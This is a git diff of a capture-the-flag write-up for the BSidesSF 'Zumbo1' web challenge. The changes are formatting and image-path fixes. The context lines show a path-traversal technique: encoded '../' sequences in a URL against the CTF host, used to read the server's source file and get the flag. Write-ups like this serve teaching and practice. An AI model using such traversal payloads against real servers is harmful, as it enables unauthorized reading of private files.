@@ -1,8 +1,8 @@
-Challenge: Zumbo1 |
+Challenge: Zumbo1 
 ----------------------------------------
-Category: Web |
+Category: Web 
 ----------------------------------------
-20 points |
+20 points 
 ----------------------------------------
 
 ```
@@ -18,7 +18,7 @@ Stages 2 and 3 - coming soon!
 
 We connect to the site.
 
-<img src="./../files/site2.png">
+<img src="../../files/site2.png">
 
 ```
 We look at the source code and find hint: <!-- page: index.template, src: /code/server.py -->
@@ -34,7 +34,7 @@ we test null byte %00:
 http://zumbo-8ac445b1.ctf.bsidessf.net/%00/code/server.py
 file() argument 1 must be encoded string without null bytes, not unicode
 ```
-<img src="./../files/erreur_null_byte.png">
+<img src="../../files/erreur_null_byte.png">
 ```
 We have a problem with encoded string!!!!!
 . => %2e
@@ -43,7 +43,7 @@ We have a problem with encoded string!!!!!
 We test with:
 http://zumbo-8ac445b1.ctf.bsidessf.net/%2e%2e%2f%2e%2e/code/server.py
 ```
-<img src="./../files/flag1.png">
+<img src="../../files/flag1.png">
 
 ``` 
 Bingo we have the source code and first flag !!!!!!
